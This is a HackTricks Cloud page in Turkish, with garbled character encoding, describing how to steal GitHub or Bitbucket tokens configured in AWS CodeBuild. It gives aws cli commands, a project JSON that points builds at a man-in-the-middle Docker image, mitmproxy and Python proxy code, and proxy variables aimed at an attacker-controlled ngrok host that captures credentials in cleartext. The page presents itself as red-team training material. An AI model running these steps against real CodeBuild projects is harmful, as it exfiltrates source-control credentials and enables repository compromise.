# AWS Codebuild - Token Leakage

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live) **bizi takip edin.**
* **HackTricks'e PR gÃ¶ndererek hacking ipuÃ§larÄ±nÄ± paylaÅŸÄ±n:** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±.

</details>
{% endhint %}

## Github/Bitbucket KonfigÃ¼re EdilmiÅŸ TokenlarÄ± Kurtarma

Ã–ncelikle, sÄ±zdÄ±rabileceÄŸiniz herhangi bir kaynak kimlik bilgisi olup olmadÄ±ÄŸÄ±nÄ± kontrol edin:
```bash
aws codebuild list-source-credentials
```
### Docker Image ile

Ã–rneÄŸin Github'a kimlik doÄŸrulamanÄ±n hesapta ayarlandÄ±ÄŸÄ±nÄ± fark ederseniz, Codebuild'i projenin derlemesini Ã§alÄ±ÅŸtÄ±rmak iÃ§in **belirli bir docker image kullanmaya** yÃ¶nlendirerek bu **eriÅŸimi** (**GH token veya OAuth token**) **dÄ±ÅŸarÄ± Ã§Ä±karabilirsiniz**.

Bu amaÃ§la, **yeni bir Codebuild projesi oluÅŸturabilir** veya mevcut bir projenin **ortamÄ±nÄ±** deÄŸiÅŸtirerek **Docker image** ayarlayabilirsiniz.

KullanabileceÄŸiniz Docker image [https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm). Bu, **`https_proxy`**, **`http_proxy`** ve **`SSL_CERT_FILE`** ortam deÄŸiÅŸkenlerini ayarlayacak Ã§ok basit bir Docker image'dir. Bu, **`https_proxy`** ve **`http_proxy`**'de belirtilen ana bilgisayarÄ±n trafiÄŸinin Ã§oÄŸunu kesmenize ve **`SSL_CERT_FILE`**'de belirtilen SSL CERT'e gÃ¼venmenize olanak tanÄ±r.

1. **Kendi Docker MitM image'inizi oluÅŸturun ve yÃ¼kleyin**
* Proxy IP adresinizi ayarlamak ve SSL sertifikanÄ±zÄ± ayarlamak iÃ§in repo talimatlarÄ±nÄ± izleyin ve **docker image'i oluÅŸturun**.
* Metadata endpoint'ine yapÄ±lan istekleri kesmemek iÃ§in **`http_proxy`'yi AYARLAMAYIN**.
* Proxy'yi ana bilgisayarÄ±nÄ±za ayarlamak iÃ§in **`ngrok`** kullanabilirsiniz, Ã¶rneÄŸin `ngrok tcp 4444`
* Docker image'i oluÅŸturduktan sonra, **bir public repo'ya yÃ¼kleyin** (Dockerhub, ECR...)
2. **OrtamÄ± ayarlayÄ±n**
* **Yeni bir Codebuild projesi oluÅŸturun** veya mevcut bir projenin ortamÄ±nÄ± **deÄŸiÅŸtirin**.
* Projeyi **Ã¶nceden oluÅŸturulmuÅŸ Docker image'i** kullanacak ÅŸekilde ayarlayÄ±n.

<figure><img src="../../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

3. **MitM proxy'yi ana bilgisayarÄ±nÄ±za ayarlayÄ±n**

* **Github repo**'sunda belirtildiÄŸi gibi, ÅŸu tÃ¼r bir ÅŸey kullanabilirsiniz:
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
{% hint style="success" %}
**KullanÄ±lan mitmproxy sÃ¼rÃ¼mÃ¼ 9.0.1'di**, 10. sÃ¼rÃ¼mle bunun Ã§alÄ±ÅŸmayabileceÄŸi bildirildi.
{% endhint %}

4. **Build'i Ã§alÄ±ÅŸtÄ±rÄ±n ve kimlik bilgilerini yakalayÄ±n**

*   **Authorization** baÅŸlÄ±ÄŸÄ±nda token'Ä± gÃ¶rebilirsiniz:

<figure><img src="../../../../.gitbook/assets/image (273).png" alt=""><figcaption></figcaption></figure>

Bu, aws cli'dan da ÅŸu ÅŸekilde yapÄ±labilir

{% code overflow="wrap" %}
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
{% endcode %}

### ~~HTTP protokolÃ¼ ile~~

{% hint style="success" %}
**Bu gÃ¼venlik aÃ§Ä±ÄŸÄ± AWS tarafÄ±ndan 20 Åubat 2023 haftasÄ±nda (muhtemelen Cuma gÃ¼nÃ¼) dÃ¼zeltildi. Bu yÃ¼zden bir saldÄ±rgan artÄ±k bunu kÃ¶tÃ¼ye kullanamaz :)**
{% endhint %}

**CodeBuild Ã¼zerinde yÃ¼kseltilmiÅŸ izinlere sahip bir saldÄ±rgan, yapÄ±landÄ±rÄ±lmÄ±ÅŸ Github/Bitbucket token'Ä±nÄ± veya izinler OAuth Ã¼zerinden yapÄ±landÄ±rÄ±lmÄ±ÅŸsa, koda eriÅŸmek iÃ§in kullanÄ±lan geÃ§ici OAuth token'Ä±nÄ± sÄ±zdÄ±rabilir.**

* Bir saldÄ±rgan, **http\_proxy** ve **https\_proxy** ortam deÄŸiÅŸkenlerini kendi makinesine iÅŸaret edecek ÅŸekilde (Ã¶rneÄŸin `http://5.tcp.eu.ngrok.io:14972`) CodeBuild projesine ekleyebilir.

<figure><img src="../../../../.gitbook/assets/image (232).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (213).png" alt=""><figcaption></figcaption></figure>

* Daha sonra, github deposunun URL'sini HTTPS yerine HTTP kullanacak ÅŸekilde deÄŸiÅŸtirebilir, Ã¶rneÄŸin: \*\*http://\*\*github.com/carlospolop-forks/TestActions
* Daha sonra, proxy deÄŸiÅŸkenlerinin (http\_proxy ve https\_proxy) iÅŸaret ettiÄŸi portta [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) adresindeki temel Ã¶rneÄŸi Ã§alÄ±ÅŸtÄ±rabilir.
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
* Son olarak, **Projeyi oluÅŸtur** butonuna tÄ±klayÄ±n, **kimlik bilgileri** mitm portuna **aÃ§Ä±k metin** (base64) olarak **gÃ¶nderilecektir**:

<figure><img src="../../../../.gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
ArtÄ±k bir saldÄ±rgan, token'Ä± kendi makinesinden kullanabilecek, sahip olduÄŸu tÃ¼m ayrÄ±calÄ±klarÄ± listeleyebilecek ve CodeBuild hizmetini doÄŸrudan kullanmaktan daha kolay (kÃ¶tÃ¼ye) kullanabilecektir.
{% endhint %}

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live) **bizi takip edin**.
* **HackTricks'e** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na PR gÃ¶ndererek **hacking ipuÃ§larÄ±nÄ± paylaÅŸÄ±n**.

</details>
{% endhint %}
